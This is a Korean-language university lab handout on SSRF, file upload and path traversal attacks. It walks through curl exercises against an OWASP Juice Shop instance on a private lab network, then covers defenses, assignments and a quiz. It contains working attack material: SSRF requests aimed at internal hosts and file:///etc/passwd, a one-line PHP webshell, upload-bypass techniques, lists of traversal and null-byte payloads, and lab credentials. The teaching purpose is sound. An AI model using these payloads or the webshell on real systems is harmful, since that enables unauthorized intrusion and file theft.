# Week 07: OWASP Top 10 (4) - SSRF, 파일 업로드, 경로 탐색 (상세 버전)

## 학습 목표
- SSRF(Server-Side Request Forgery)의 개념과 위험성을 이해한다
- 파일 업로드 취약점의 유형과 공격 기법을 파악한다
- 경로 탐색(Path Traversal) 공격을 실습한다
- JuiceShop의 /ftp 디렉토리를 통한 파일 접근 공격을 수행한다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (이 과목에서 자주 나오는 용어)

> 대학 1~2학년이 처음 접할 수 있는 보안/IT 용어를 정리한다.
> 강의 중 모르는 용어가 나오면 이 표를 참고하라.

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **페이로드** | Payload | 공격에 사용되는 실제 데이터/코드. 예: `' OR 1=1--` | 미사일의 탄두 |
| **익스플로잇** | Exploit | 취약점을 악용하는 기법 또는 코드 | 열쇠 없이 문을 여는 방법 |
| **셸** | Shell | 운영체제와 사용자를 연결하는 명령어 해석기 (bash, sh 등) | OS에게 말 걸 수 있는 창구 |
| **리버스 셸** | Reverse Shell | 대상 서버가 공격자에게 역방향 연결을 맺는 것 | 도둑이 집에서 밖으로 전화를 거는 것 |
| **포트** | Port | 서버에서 특정 서비스를 식별하는 번호 (0~65535) | 아파트 호수 |
| **데몬** | Daemon | 백그라운드에서 실행되는 서비스 프로그램 | 24시간 근무하는 경비원 |
| **패킷** | Packet | 네트워크로 전송되는 데이터의 단위 | 택배 상자 하나 |
| **프록시** | Proxy | 클라이언트와 서버 사이에서 중개하는 서버 | 대리인, 중간 거래자 |
| **해시** | Hash | 임의 길이 데이터를 고정 길이 값으로 변환하는 함수 (SHA-256 등) | 지문 (고유하지만 원본 복원 불가) |
| **토큰** | Token | 인증 정보를 담은 문자열 (JWT, API Key 등) | 놀이공원 입장권 |
| **JWT** | JSON Web Token | Base64로 인코딩된 JSON 기반 인증 토큰 | 이름·권한이 적힌 입장권 |
| **Base64** | Base64 | 바이너리 데이터를 텍스트로 인코딩하는 방법 | 암호가 아닌 "포장" (누구나 풀 수 있음) |
| **CORS** | Cross-Origin Resource Sharing | 다른 도메인에서의 API 호출 허용 설정 | "외부인 출입 허용" 표지판 |
| **API** | Application Programming Interface | 프로그램 간 통신 규약 | 식당의 메뉴판 (주문 양식) |
| **REST** | Representational State Transfer | URL + HTTP 메서드로 자원을 조작하는 API 스타일 | 도서관 대출 시스템 (책 이름으로 검색/대출/반납) |
| **SSH** | Secure Shell | 원격 서버에 안전하게 접속하는 프로토콜 | 암호화된 전화선 |
| **sudo** | SuperUser DO | 관리자(root) 권한으로 명령 실행 | "사장님 권한으로 실행" |
| **SUID** | Set User ID | 실행 시 파일 소유자 권한으로 실행되는 특수 권한 | 다른 사람의 사원증을 빌려 출입 |
| **IPS** | Intrusion Prevention System | 네트워크 침입 방지 시스템 (악성 트래픽 차단) | 공항 보안 검색대 |
| **SIEM** | Security Information and Event Management | 보안 로그를 수집·분석하는 통합 관제 시스템 | CCTV 관제실 |
| **WAF** | Web Application Firewall | 웹 공격을 탐지·차단하는 방화벽 | 웹사이트 전용 경비원 |
| **nftables** | nftables | Linux 커널 방화벽 프레임워크 (iptables 후계) | 건물 출입구 차단기 |
| **Suricata** | Suricata | 오픈소스 IDS/IPS 엔진 | 공항 X-ray 검색기 |
| **Wazuh** | Wazuh | 오픈소스 SIEM 플랫폼 | CCTV + AI 관제 시스템 |
| **ATT&CK** | MITRE ATT&CK | 실제 공격 전술·기법을 분류한 데이터베이스 | 범죄 수법 백과사전 |
| **OWASP** | Open Web Application Security Project | 웹 보안 취약점 연구 국제 단체 | 웹 보안의 표준 기관 |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 점수 (0~10점) | 질병 위험도 등급 |
| **CVE** | Common Vulnerabilities and Exposures | 취약점 고유 식별 번호 | 질병의 고유 코드 (예: COVID-19) |
| **OpsClaw** | OpsClaw | 보안 작업 자동화·증적 관리 플랫폼 (이 수업에서 사용) | 보안 작업 일지 + 자동화 시스템 |


---

# Week 07: OWASP Top 10 (4) - SSRF, 파일 업로드, 경로 탐색

## 학습 목표

- SSRF(Server-Side Request Forgery)의 개념과 위험성을 이해한다
- 파일 업로드 취약점의 유형과 공격 기법을 파악한다
- 경로 탐색(Path Traversal) 공격을 실습한다
- JuiceShop의 /ftp 디렉토리를 통한 파일 접근 공격을 수행한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| opsclaw | 10.20.30.201 | 실습 기지 |
| secu | 10.20.30.1 | 방화벽/IPS (내부 서비스) |
| web | 10.20.30.80 | JuiceShop:3000, Apache:80 |
| siem | 10.20.30.100 | Wazuh SIEM (내부 서비스) |

---

## 1. SSRF (Server-Side Request Forgery)

### 1.1 SSRF란?

SSRF는 **서버가 공격자가 지정한 URL로 요청을 보내게 만드는** 공격이다. 서버를 "프록시"로 악용하여 내부 네트워크에 접근한다.

**왜 위험한가?**
- 외부에서 접근 불가능한 **내부 네트워크** 서비스에 접근 가능
- 클라우드 환경의 **메타데이터 서비스**(169.254.169.254) 접근
- 내부 관리 콘솔, 데이터베이스 등에 접근
- 방화벽을 우회하여 내부 스캔 수행

### 1.2 SSRF 동작 원리

```
정상적인 경우:
  사용자 → 서버: "http://example.com의 이미지를 가져와줘"
  서버 → example.com: GET /image.png
  서버 → 사용자: 이미지 반환

SSRF 공격:
  공격자 → 서버: "http://10.20.30.100:9200의 데이터를 가져와줘"
  서버 → 10.20.30.100:9200: GET / (내부 Elasticsearch!)
  서버 → 공격자: 내부 데이터 반환!
```

### 1.3 SSRF 실습: 내부 네트워크 스캔

JuiceShop에서 URL을 입력받는 기능이 있다면 SSRF를 시도할 수 있다.

```bash
# JuiceShop의 프로필 이미지 URL 업로드 기능 확인
# 먼저 로그인
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 프로필 이미지 URL을 내부 주소로 설정 시도
curl -s -X POST http://10.20.30.80:3000/profile/image/url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"imageUrl":"http://10.20.30.100:9200/"}' \
  | python3 -m json.tool 2>/dev/null | head -20

# localhost의 다른 포트 스캔 시도
curl -s -X POST http://10.20.30.80:3000/profile/image/url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"imageUrl":"http://localhost:22/"}' \
  | python3 -m json.tool 2>/dev/null | head -10

# 파일 프로토콜로 서버 파일 읽기 시도
curl -s -X POST http://10.20.30.80:3000/profile/image/url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"imageUrl":"file:///etc/passwd"}' \
  | python3 -m json.tool 2>/dev/null | head -20
```

### 1.4 SSRF를 이용한 내부 서비스 탐색

```bash
# 서버를 통해 내부 네트워크의 서비스 확인
# (SSRF가 가능한 경우)
INTERNAL_TARGETS=(
  "http://10.20.30.1:22"       # secu SSH
  "http://10.20.30.1:8002"     # secu SubAgent
  "http://10.20.30.100:22"     # siem SSH
  "http://10.20.30.100:1514"   # siem Wazuh
  "http://127.0.0.1:3000"      # localhost JuiceShop
  "http://127.0.0.1:80"        # localhost Apache
)

for target in "${INTERNAL_TARGETS[@]}"; do
  echo "Testing SSRF to: $target"
  RESULT=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    http://10.20.30.80:3000/profile/image/url \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"imageUrl\":\"$target\"}" --max-time 3 2>/dev/null)
  echo "  Response: HTTP $RESULT"
done
```

### 1.5 SSRF 방어

1. **허용 목록(Allowlist)**: 접근 가능한 URL/도메인을 명시적으로 제한
2. **내부 IP 차단**: 사설 IP(10.x, 172.16.x, 192.168.x), localhost 요청 차단
3. **프로토콜 제한**: http/https만 허용 (file://, gopher:// 차단)
4. **DNS 리바인딩 방지**: 요청 전 DNS 조회 결과를 검증
5. **네트워크 분리**: 웹 서버에서 내부 서비스 접근 자체를 차단

---

## 2. 파일 업로드 취약점

> **이 실습을 왜 하는가?**
> 사이버보안 공격/웹해킹/침투테스트 과목에서 이 주차의 실습은 핵심 개념을 **직접 체험**하여 이론을 실무로 연결하는 과정이다.
> 모의해킹 보고서에서 이 기법의 발견은 위험도 분류의 핵심 근거가 된다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이론에서 배운 개념이 실제 시스템에서 어떻게 동작하는지 확인
> - 실제 명령어와 도구 사용법을 체득
> - 결과를 분석하고 보안 관점에서 판단하는 능력 배양
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.


### 2.1 파일 업로드가 위험한 이유

웹 서버에 파일을 업로드할 수 있으면:
- **웹셸(Webshell)** 업로드: 서버에서 명령을 실행하는 PHP/JSP 파일
- **악성 스크립트** 업로드: 다른 사용자에게 실행되는 XSS 파일
- **서버 자원 소모**: 대용량 파일로 DoS 공격
- **덮어쓰기**: 기존 파일을 악성 파일로 교체

### 2.2 웹셸(Webshell) 개념

웹셸은 웹 서버에 올려서 브라우저로 OS 명령을 실행하는 스크립트다:

```php
<?php
// 가장 간단한 PHP 웹셸 (예시 - 절대 실제 서버에 올리지 말 것!)
echo system($_GET['cmd']);
?>
```

```
사용: http://target.com/uploads/shell.php?cmd=whoami
결과: www-data
```

### 2.3 파일 업로드 우회 기법

| 검증 방식 | 우회 방법 |
|-----------|-----------|
| 확장자 검사 (블랙리스트) | .php5, .phtml, .pHp 등 대체 확장자 |
| 확장자 검사 (화이트리스트) | 이중 확장자: image.php.jpg |
| Content-Type 검사 | Content-Type을 image/jpeg로 위조 |
| 파일 시그니처 검사 | 파일 앞에 GIF89a 추가 (GIF 시그니처) |
| 파일 크기 제한 | 작은 웹셸 사용 |

### 2.4 실습: JuiceShop 파일 업로드

```bash
# 프로필 이미지 업로드 기능 테스트
# 정상 이미지 업로드
echo "GIF89a" > /tmp/test.gif
curl -s -X POST http://10.20.30.80:3000/profile/image/file \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/test.gif;type=image/gif" \
  | python3 -m json.tool 2>/dev/null

# HTML 파일을 이미지로 위장하여 업로드 시도
echo '<html><body><script>alert("XSS via upload")</script></body></html>' > /tmp/xss.gif
curl -s -X POST http://10.20.30.80:3000/profile/image/file \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/xss.gif;type=image/gif" \
  | python3 -m json.tool 2>/dev/null

# 다양한 확장자 시도
for ext in php html svg xml; do
  echo "test" > /tmp/test.$ext
  RESULT=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    http://10.20.30.80:3000/profile/image/file \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@/tmp/test.$ext;type=image/jpeg")
  echo "Upload .$ext: HTTP $RESULT"
done
```

### 2.5 파일 업로드 방어

1. **확장자 화이트리스트**: 허용된 확장자만 허용 (.jpg, .png, .gif)
2. **Content-Type 검증**: MIME 타입 확인
3. **파일 내용 검사**: 실제 파일 매직 바이트 확인
4. **업로드 디렉토리 격리**: 실행 권한 없는 별도 디렉토리에 저장
5. **파일명 변경**: 업로드된 파일명을 랜덤하게 변경
6. **크기 제한**: 최대 파일 크기 설정

---

## 3. 경로 탐색 (Path Traversal / Directory Traversal)

### 3.1 경로 탐색이란?

URL이나 파라미터에 `../`(상위 디렉토리 이동)를 삽입하여 **웹 루트 밖의 파일**에 접근하는 공격이다.

**동작 원리:**
```
정상 요청:
  GET /download?file=report.pdf
  서버 경로: /var/www/files/report.pdf

공격 요청:
  GET /download?file=../../../etc/passwd
  서버 경로: /var/www/files/../../../etc/passwd = /etc/passwd
```

### 3.2 /etc/passwd 파일

리눅스에서 `/etc/passwd`는 사용자 계정 정보가 담긴 파일이다. 경로 탐색 테스트의 대표적 타겟이다.

```bash
# 직접 확인 (opsclaw 서버에서)
head -5 /etc/passwd
```

**예상 출력:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

### 3.3 실습: JuiceShop 경로 탐색

JuiceShop의 `/ftp` 디렉토리는 파일 다운로드 기능을 제공한다.

**Step 1: /ftp 디렉토리 확인**

```bash
# ftp 디렉토리 목록 확인
curl -s http://10.20.30.80:3000/ftp | python3 -m json.tool
```

**예상 출력:**
```json
[
  "acquisitions.md",
  "coupons_2013.md.bak",
  "eastere.gg",
  "incident-support.kdbx",
  "legal.md",
  "package.json.bak",
  "quarantine",
  "suspicious_errors.yml"
]
```

**Step 2: 파일 다운로드**

```bash
# 정상적인 파일 다운로드
curl -s http://10.20.30.80:3000/ftp/legal.md | head -20

# 백업 파일 다운로드 (민감 정보 유출 가능)
curl -s http://10.20.30.80:3000/ftp/package.json.bak | head -20

# 쿠폰 백업 파일
curl -s http://10.20.30.80:3000/ftp/coupons_2013.md.bak

# 에러 로그 (보안 정보 포함 가능)
curl -s http://10.20.30.80:3000/ftp/suspicious_errors.yml | head -30

# 이스터에그
curl -s http://10.20.30.80:3000/ftp/eastere.gg
```

**Step 3: 경로 탐색 공격**

> **검증 완료:** Null byte(`%2500`) 우회로 package.json.bak 파일 내용 접근 성공.
> JuiceShop v6.2.0-SNAPSHOT 버전 정보 노출 확인.

```bash
# 기본 경로 탐색 시도
curl -s http://10.20.30.80:3000/ftp/../../etc/passwd
# 대부분 403 Forbidden 또는 차단됨

# URL 인코딩으로 우회 시도
# ../ → %2e%2e%2f
curl -s "http://10.20.30.80:3000/ftp/%2e%2e/%2e%2e/etc/passwd"

# 이중 인코딩 시도
# %2e → %252e (% 자체를 인코딩)
curl -s "http://10.20.30.80:3000/ftp/%252e%252e/%252e%252e/etc/passwd"

# Null byte injection 시도 (구버전 서버에서 동작)
# %00으로 확장자 검사 우회
curl -s "http://10.20.30.80:3000/ftp/../../etc/passwd%2500.md"
curl -s "http://10.20.30.80:3000/ftp/../../etc/passwd%00.md"
```

**Step 4: JuiceShop Challenge - Poison Null Byte**

JuiceShop은 `/ftp` 경로에서 `.md`와 `.pdf` 파일만 다운로드를 허용한다. Null byte로 우회할 수 있다.

```bash
# .md/.pdf가 아닌 파일 직접 다운로드 시도
curl -s -o /dev/null -w "%{http_code}\n" http://10.20.30.80:3000/ftp/package.json.bak
# 200 OK (이미 허용되는 경우) 또는 403

# Null byte 우회로 다른 확장자 파일 다운로드
curl -s "http://10.20.30.80:3000/ftp/eastere.gg%2500.md"
curl -s "http://10.20.30.80:3000/ftp/suspicious_errors.yml%2500.md"

# 쿠폰 파일 다운로드 시도
curl -s "http://10.20.30.80:3000/ftp/coupons_2013.md.bak%2500.md"
```

> **Null Byte(%00)의 원리**: C 언어 기반 시스템에서 `%00`(NULL 문자)은 문자열의 끝을 의미한다. 확장자 검사 시 `.md`까지 확인하지만, 파일 시스템에서 실제 열리는 파일은 `%00` 이전의 이름이다.

### 3.4 경로 탐색 방어

```bash
# 1. 경로 정규화 (서버 측 코드)
# realpath()로 실제 경로를 확인하고 허용된 디렉토리 안에 있는지 검증

# 2. 입력에서 ../를 제거 또는 거부

# 3. chroot 또는 컨테이너로 격리

# 4. 화이트리스트 방식으로 접근 가능한 파일만 허용
```

---

## 4. JuiceShop 보안 설정 파일 탐색

### 4.1 숨겨진 파일 찾기

```bash
# 일반적으로 웹 서버에서 노출될 수 있는 파일들
FILES_TO_CHECK=(
  "/.env"
  "/.git/config"
  "/api-docs"
  "/swagger.json"
  "/api/swagger.json"
  "/robots.txt"
  "/sitemap.xml"
  "/.htaccess"
  "/web.config"
  "/crossdomain.xml"
  "/security.txt"
  "/.well-known/security.txt"
)

echo "=== JuiceShop (:3000) ==="
for file in "${FILES_TO_CHECK[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000$file")
  if [ "$CODE" != "404" ]; then
    echo "  $file -> HTTP $CODE"
  fi
done

echo ""
echo "=== Apache (:80) ==="
for file in "${FILES_TO_CHECK[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80$file")
  if [ "$CODE" != "404" ]; then
    echo "  $file -> HTTP $CODE"
  fi
done
```

### 4.2 Swagger/API 문서 접근

```bash
# JuiceShop API 문서가 있는지 확인
curl -s http://10.20.30.80:3000/api-docs/ | head -20

# Swagger JSON
curl -s http://10.20.30.80:3000/api-docs/swagger.json | python3 -m json.tool 2>/dev/null | head -30
```

### 4.3 소스코드 정보 유출

```bash
# JavaScript 소스 맵 확인
curl -s -o /dev/null -w "%{http_code}\n" http://10.20.30.80:3000/main.js.map

# package.json (의존성 정보)
curl -s http://10.20.30.80:3000/ftp/package.json.bak | python3 -m json.tool 2>/dev/null | head -30
```

---

## 5. 종합 실습: 파일 접근 공격 체인

### Step 1: 정보 수집

```bash
echo "=== Step 1: 파일 시스템 탐색 ==="
# /ftp 디렉토리 전체 목록
curl -s http://10.20.30.80:3000/ftp | python3 -m json.tool
```

### Step 2: 민감 파일 다운로드

```bash
echo "=== Step 2: 민감 파일 수집 ==="
# 각 파일 다운로드
mkdir -p /tmp/juiceshop_loot

for file in "legal.md" "package.json.bak" "coupons_2013.md.bak" "suspicious_errors.yml" "eastere.gg" "acquisitions.md"; do
  echo "Downloading: $file"
  curl -s "http://10.20.30.80:3000/ftp/$file" -o "/tmp/juiceshop_loot/$file" 2>/dev/null
  # Null byte 우회도 시도
  curl -s "http://10.20.30.80:3000/ftp/${file}%2500.md" -o "/tmp/juiceshop_loot/${file}.nullbyte" 2>/dev/null
done

echo ""
echo "Downloaded files:"
ls -la /tmp/juiceshop_loot/
```

### Step 3: 다운로드 파일 분석

```bash
echo "=== Step 3: 파일 분석 ==="

echo "--- package.json.bak (의존성 정보) ---"
cat /tmp/juiceshop_loot/package.json.bak 2>/dev/null | head -20

echo ""
echo "--- suspicious_errors.yml (에러 로그) ---"
cat /tmp/juiceshop_loot/suspicious_errors.yml 2>/dev/null | head -20

echo ""
echo "--- coupons_2013.md.bak (쿠폰 정보) ---"
cat /tmp/juiceshop_loot/coupons_2013.md.bak 2>/dev/null | head -10
```

### Step 4: 경로 탐색 공격 시도

```bash
echo "=== Step 4: 경로 탐색 ==="
TRAVERSAL_PAYLOADS=(
  "../etc/passwd"
  "../../etc/passwd"
  "../../../etc/passwd"
  "..%2f..%2f..%2fetc%2fpasswd"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  "....//....//....//etc/passwd"
  "..%252f..%252f..%252fetc%252fpasswd"
)

for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
  RESULT=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/ftp/$payload" --max-time 3)
  echo "Payload: $payload -> HTTP $RESULT"
done
```

---

## 6. OpsClaw로 파일 접근 테스트 자동화

```bash
# 파일 접근 테스트 프로젝트 생성
PROJECT_ID=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"week07-file-access","request_text":"JuiceShop 파일접근/SSRF 취약점 점검","master_mode":"external"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

# 파일 접근 테스트 자동 실행
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1, "instruction_prompt":"curl -s http://10.20.30.80:3000/ftp", "risk_level":"low"},
      {"order":2, "instruction_prompt":"curl -s http://10.20.30.80:3000/ftp/package.json.bak | head -20", "risk_level":"low"},
      {"order":3, "instruction_prompt":"curl -s http://10.20.30.80:3000/ftp/suspicious_errors.yml | head -20", "risk_level":"low"}
    ],
    "subagent_url": "http://localhost:8002"
  }'

# 결과 확인
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  http://localhost:8000/projects/$PROJECT_ID/evidence/summary \
  | python3 -m json.tool
```

---

## 7. 실습 체크리스트

- [ ] SSRF: 프로필 이미지 URL을 내부 IP로 설정하여 접근 시도
- [ ] /ftp 디렉토리의 모든 파일 목록 확인 및 다운로드
- [ ] package.json.bak에서 의존성 정보 분석
- [ ] Null byte(%2500) 우회로 제한된 파일 다운로드 시도
- [ ] 경로 탐색(../) 다양한 인코딩으로 /etc/passwd 접근 시도
- [ ] 숨겨진 파일/경로(.env, .git, swagger) 탐색

---

## 과제

1. JuiceShop의 `/ftp` 디렉토리에서 모든 파일을 다운로드하고, 각 파일의 내용을 분석하여 보안상 문제가 되는 정보를 정리하라
2. Null byte 공격(`%2500`)으로 `/ftp` 디렉토리의 접근 제한을 우회하고, 그 원리를 설명하라
3. SSRF 공격이 클라우드 환경(AWS, GCP)에서 특히 위험한 이유를 메타데이터 서비스와 연관지어 설명하라
4. 경로 탐색 공격을 방어하기 위한 서버 측 검증 코드를 Python이나 JavaScript로 작성하라

---

## 핵심 요약

- **SSRF**: 서버가 공격자가 지정한 URL로 요청을 보내게 하여 내부 네트워크에 접근하는 공격
- **파일 업로드**: 웹셸, 악성 스크립트 등을 업로드하여 서버를 장악하는 공격
- **경로 탐색**: `../`를 사용하여 웹 루트 밖의 시스템 파일에 접근하는 공격
- **JuiceShop /ftp**: 백업 파일, 설정 파일 등 민감한 정보가 노출된 디렉토리
- **Null byte**: 확장자 검사를 우회하는 기법 (`%2500` 또는 `%00`)
- **방어**: 입력 검증, 화이트리스트, 경로 정규화, 업로드 디렉토리 격리

> **다음 주 예고**: Week 08은 중간고사로, CTF(Capture The Flag) 형식의 실습 시험이다. Week 02~07에서 배운 모든 기법을 활용하여 JuiceShop 챌린지를 풀어야 한다.


---


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** "Week 07: OWASP Top 10 (4) - SSRF, 파일 업로드, 경로 탐색"에서 가장 핵심적인 학습 목표는?
- (a) 데이터베이스 최적화  (b) **사이버보안 공격의 원리와 실습**  (c) UI 개발  (d) 네트워크 속도

**Q2.** "1. SSRF (Server-Side Request Forgery)"의 보안 관점에서의 의의는?
- (a) 성능 향상  (b) **보안 위협 이해 또는 방어 역량 강화**  (c) 비용 절감  (d) 사용성 개선

**Q3.** "2. 파일 업로드 취약점"에서 사용하는 주요 도구/기법은?
- (a) 워드프로세서  (b) **사이버보안 공격 전용 도구/명령**  (c) 게임 엔진  (d) 그래픽 도구

**Q4.** 이번 실습에서 OpsClaw evidence가 제공하는 가치는?
- (a) 속도  (b) **작업 증적의 자동 기록과 감사 추적**  (c) 화면 출력  (d) 파일 압축

**Q5.** "3. 경로 탐색 (Path Traversal / Directory Traversal)"의 실무 활용 방안은?
- (a) 개인 블로그  (b) **보안 점검, 대응, 보고서 작성에 활용**  (c) 게임 개발  (d) 영상 편집

**Q6.** 이 주차에서 방어자 관점의 핵심 원칙은?
- (a) 모든 기능 비활성화  (b) **최소 권한 + 모니터링 + 대응의 조합**  (c) 무조건 차단  (d) 설정 변경 금지

**Q7.** 실습 결과를 평가할 때 가장 중요한 기준은?
- (a) 파일 크기  (b) **보안 효과성과 정확성**  (c) 실행 속도  (d) 줄 수

**Q8.** 이 주제가 전체 사이버보안 공격 커리큘럼에서 차지하는 위치는?
- (a) 독립적 주제  (b) **이전 주차의 심화/다음 주차의 기반**  (c) 선택 과목  (d) 부록

**Q9.** 실무에서 이 기법을 적용할 때 주의할 점은?
- (a) 속도  (b) **법적 허가, 범위 준수, 증적 관리**  (c) 디자인  (d) 비용

**Q10.** 이번 주차 학습의 성과를 어떻게 측정하는가?
- (a) 시간  (b) **실습 완료율 + 퀴즈 점수 + 과제 품질**  (c) 줄 수  (d) 파일 수

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b, Q6:b, Q7:b, Q8:b, Q9:b, Q10:b

---
